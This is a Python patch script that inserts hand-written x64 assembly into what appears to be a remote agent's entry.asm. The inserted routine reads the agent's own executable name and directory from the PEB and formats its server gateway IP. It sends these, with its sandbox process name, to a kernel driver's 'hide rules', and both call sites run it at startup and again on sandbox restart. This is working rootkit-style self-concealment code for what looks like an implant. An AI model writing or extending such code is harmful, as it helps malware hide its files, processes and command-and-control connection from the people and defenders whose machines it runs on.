# -*- coding: utf-8 -*-
"""Insert send_startup_protect into entry.asm + wire call sites."""
import io

PATH = r"D:\Fei\agents\x64_asm\entry.asm"
raw = io.open(PATH, "rb").read().decode("utf-8", errors="replace")
crlf = "\r\n" in raw
src = raw.replace("\r\n", "\n")

BS = chr(92)

# --- 1. ASCII sandbox name next to the wide path --------------------
anchor = "sandbox_exe_path:"
assert anchor in src
src = src.replace(anchor,
    "sandbox_exe_name_a: db \"sandbox.exe\", 0\n" + anchor, 1)

# --- 2. the function, inserted before process_command ---------------
anchor2 = "; ===========================================================================\n; process_command:"
assert anchor2 in src

func = r'''; ===========================================================================
; send_startup_protect: merge this agent's own identity into the kernel
; driver's hide rules through sandbox command 0x08 (registry Config merge).
; Payload: image-name \0 agent-dir \0 gateway-ip \0 "sandbox.exe" \0
; Failures are silent: with no driver deployed the sandbox answers
; driver-absent and nothing is written.
; ===========================================================================
send_startup_protect:
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15
    sub rsp, 48                     ; 7 pushes + 48 keeps calls 16-aligned

    ; ---- PEB -> ProcessParameters -> ImagePathName (x64) ----
    mov rax, [gs:0x60]              ; PEB
    mov r15, [rax + 0x20]           ; ProcessParameters
    movzx ecx, word [r15 + 0x60]    ; ImagePathName.Length
    mov rsi, [r15 + 0x68]           ; ImagePathName.Buffer
    test rsi, rsi
    jz .sp_done
    mov r14, rsi
    add r14, rcx                    ; end (bytes)

    ; skip a leading "\??\" (2 wchars checked, 4 skipped on match)
    cmp ecx, 8
    jb .sp_noprefix
    cmp word [rsi], 0x005C          ; '\'
    jne .sp_noprefix
    cmp word [rsi + 2], 0x003F      ; '?'
    jne .sp_noprefix
    cmp word [rsi + 4], 0x003F      ; '?'
    jne .sp_noprefix
    add rsi, 8
.sp_noprefix:

    ; ---- wide -> ASCII into pipe_buffer (scratch) ----
    lea rdi, [pipe_buffer]
.sp_w2a:
    cmp rsi, r14
    jae .sp_w2a_done
    movzx eax, word [rsi]
    cmp eax, 0xFF
    ja .sp_w2a_skip                 ; non-ASCII wchar: dropped
    mov [rdi], al
    inc rdi
.sp_w2a_skip:
    add rsi, 2
    jmp .sp_w2a
.sp_w2a_done:
    mov byte [rdi], 0
    mov r13, rdi                    ; ascii end (exclusive)

    ; ---- split at the last '\' : dir | name ----
    lea rbx, [pipe_buffer]          ; ascii start
    mov r12, r13                    ; scan cursor = end
.sp_findbs:
    cmp r12, rbx
    jbe .sp_nosplit
    dec r12
    cmp byte [r12], 0x5C            ; '\'
    jne .sp_findbs
    ; r12 -> last backslash
    mov byte [r12], 0               ; terminate the dir part
    lea rbx, [r12 + 1]              ; name start
    jmp .sp_haveparts
.sp_nosplit:
    lea rbx, [pipe_buffer]          ; no backslash: name only, dir empty
    mov byte [pipe_buffer], 0
.sp_haveparts:

    ; ---- payload into recv_plaintext_buf + 5 (frame header is 5) ----
    lea rdi, [recv_plaintext_buf + 5]

    ; copy name (rbx .. r13)
    mov rsi, rbx
.sp_cp1:
    mov al, [rsi]
    mov [rdi], al
    inc rsi
    inc rdi
    test al, al
    jnz .sp_cp1

    ; copy dir (pipe_buffer .. NUL)
    lea rsi, [pipe_buffer]
.sp_cp2:
    mov al, [rsi]
    mov [rdi], al
    inc rsi
    inc rdi
    test al, al
    jnz .sp_cp2

    ; gateway IP dotted from sockaddr_in.sin_addr ([server_addr+4])
    movzx eax, byte [server_addr + 4]
    call .sp_octet                  ; writes octet + '.' ; rdi advanced
    movzx eax, byte [server_addr + 5]
    call .sp_octet
    movzx eax, byte [server_addr + 6]
    call .sp_octet
    movzx eax, byte [server_addr + 7]
    call .sp_octet_nodot
    mov byte [rdi], 0
    inc rdi

    ; "sandbox.exe"
    lea rsi, [sandbox_exe_name_a]
.sp_cp3:
    mov al, [rsi]
    mov [rdi], al
    inc rsi
    inc rdi
    test al, al
    jnz .sp_cp3

    ; ---- frame: [0x08][len u32 LE][payload] ----
    lea rax, [recv_plaintext_buf + 5]
    mov rdx, rdi
    sub rdx, rax                    ; payload length
    mov byte [recv_plaintext_buf], 0x08
    mov dword [recv_plaintext_buf + 1], edx   ; u32 LE length
    add rdx, 5                      ; total frame size for the pipe
    lea rcx, [recv_plaintext_buf]
    call sandbox_send
    test eax, eax
    jz .sp_done

    ; ---- consume the response (prefix + body) to keep the pipe synced ----
    lea rcx, [recv_plaintext_buf]
    mov edx, 4
    call sandbox_recv_exact
    test eax, eax
    jz .sp_done
    mov eax, [recv_plaintext_buf]
    test eax, eax
    jz .sp_done
    cmp eax, MAX_AGENT_PAYLOAD
    ja .sp_done                     ; oversized: leave (resp is tiny anyway)
    lea rcx, [pipe_buffer]
    mov edx, eax
    call sandbox_recv_exact         ; discard

.sp_done:
    add rsp, 48
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret

; .sp_octet: eax = octet value; writes decimal digits + '.' at rdi
.sp_octet:
    push rax
    push rcx
    push rdx
    mov ecx, 100
    xor edx, edx
    div ecx                         ; eax = hundreds, edx = remainder
    test eax, eax
    jz .sp_o1
    add al, '0'
    mov [rdi], al
    inc rdi
.sp_o1:
    mov eax, edx
    mov ecx, 10
    xor edx, edx
    div ecx                         ; eax = tens
    test eax, eax
    jz .sp_o2
    add al, '0'
    mov [rdi], al
    inc rdi
.sp_o2:
    add dl, '0'
    mov [rdi], dl
    inc rdi
    mov byte [rdi], '.'
    inc rdi
    pop rdx
    pop rcx
    pop rax
    ret
.sp_octet_nodot:
    push rax
    push rcx
    push rdx
    mov ecx, 100
    xor edx, edx
    div ecx
    test eax, eax
    jz .sp_n1
    add al, '0'
    mov [rdi], al
    inc rdi
.sp_n1:
    mov eax, edx
    mov ecx, 10
    xor edx, edx
    div ecx
    test eax, eax
    jz .sp_n2
    add al, '0'
    mov [rdi], al
    inc rdi
.sp_n2:
    add dl, '0'
    mov [rdi], dl
    inc rdi
    pop rdx
    pop rcx
    pop rax
    ret

'''
src = src.replace(anchor2, func + anchor2, 1)

# --- 3. call sites ---------------------------------------------------
old = """    call create_sandbox
    test eax, eax
    jz .no_sandbox                  ; Continue even if sandbox fails
"""
assert old in src
src = src.replace(old, old + """
    ; merge self into the kernel hide rules (no-op without the driver)
    call send_startup_protect
""", 1)

old2 = """.sandbox_dead:
    call create_sandbox
    jmp .try_recv"""
assert old2 in src
src = src.replace(old2, """.sandbox_dead:
    call create_sandbox
    call send_startup_protect
    jmp .try_recv""", 1)

out_text = src.replace("\n", "\r\n") if crlf else src
io.open(PATH, "wb").write(out_text.encode("utf-8"))
print("send_startup_protect inserted")
